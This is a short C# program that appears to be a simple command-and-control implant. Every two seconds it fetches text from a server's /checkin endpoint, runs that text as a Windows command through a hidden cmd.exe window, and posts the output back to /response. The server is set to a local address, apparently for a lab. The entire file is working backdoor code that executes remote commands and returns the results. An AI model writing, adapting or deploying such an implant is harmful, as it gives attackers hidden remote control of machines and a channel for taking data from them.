using System.Diagnostics;
string responseBody;
int sleep = 2000;
string server = "http://127.0.0.1:5000";

HttpClient client = new HttpClient();
while (true) {
    Thread.Sleep(sleep);
    HttpResponseMessage response = await client.GetAsync(server + "/checkin");
    if (response.StatusCode != System.Net.HttpStatusCode.OK) {
        continue;
    }
    //response.EnsureSuccessStatusCode();
    responseBody = await response.Content.ReadAsStringAsync();
    Console.WriteLine(responseBody); //print the request for sanity checking

    //spawn a new cmd process
    Process start = new Process();
    start.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
    //and pass the response as an argument
    start.StartInfo.Arguments = "/c " + responseBody;
    start.StartInfo.UseShellExecute = false;
    start.StartInfo.CreateNoWindow = true;
    start.StartInfo.RedirectStandardOutput = true; //so we can read the output
    start.Start();
    //read the output
    string data = start.StandardOutput.ReadToEnd();
    //convert the output to a string and send it back to the server
    StringContent postdata = new StringContent(data);
    response = await client.PostAsync(server + "/response", postdata);
    responseBody = await response.Content.ReadAsStringAsync();
    Console.WriteLine(responseBody); //print the response for sanity checking
}